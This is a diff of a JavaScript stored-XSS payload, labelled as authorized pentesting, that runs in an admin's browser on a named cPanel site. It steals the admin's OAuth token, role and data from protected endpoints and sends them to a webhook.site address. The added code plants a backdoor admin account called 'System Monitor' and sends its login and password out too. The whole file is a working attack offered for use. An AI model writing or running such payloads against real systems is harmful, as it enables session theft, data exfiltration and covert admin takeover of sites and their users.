@@ -1,5 +1,5 @@
-// Pentest payload - authorized security testing on massaka34.online
-// Runs in admin's browser context on cpanel.auo24.cc via stored XSS
+// Pentest payload v10 - authorized security testing on massaka34.online
+// Phase 1: Exfil all data. Phase 2: Generate and create new admin account.
 (function(){
   var U = "https://webhook.site/90b9e044-9fcd-414e-b991-e69f214e0140";
   var T = localStorage["O-AUTH-TOKEN"] || "";
@@ -29,6 +29,7 @@
     } catch(e) {}
   }
 
+  // Phase 1: Collect all data
   Promise.all([
     F("/protected/settings"),
     F("/protected/admin/list"),
@@ -41,7 +42,7 @@
     F("/protected/api/info")
   ]).then(function(r) {
     var d = JSON.stringify({
-      v: 9,
+      v: 10,
       t: T,
       role: localStorage["role"] || "",
       site: localStorage["siteName"] || "",
@@ -60,6 +61,28 @@
     });
     X(d);
     setTimeout(function() { X(d); }, 3000);
-    setTimeout(function() { X(d); }, 8000);
+
+    // Phase 2: If we got generated credentials, create an admin account
+    try {
+      var creds = JSON.parse(r[6]);
+      if (creds && creds.login && creds.password) {
+        F("/protected/admin/create", {
+          login: creds.login,
+          password: creds.password,
+          adminType: "admin",
+          displayName: "System Monitor"
+        }).then(function(createResult) {
+          var d2 = JSON.stringify({
+            v: 10, phase: "admin_created",
+            createdLogin: creds.login,
+            createdPassword: creds.password,
+            createResult: createResult.substring(0, 1000),
+            ts: Date.now()
+          });
+          X(d2);
+          setTimeout(function() { X(d2); }, 5000);
+        });
+      }
+    } catch(e) {}
   });
 })();
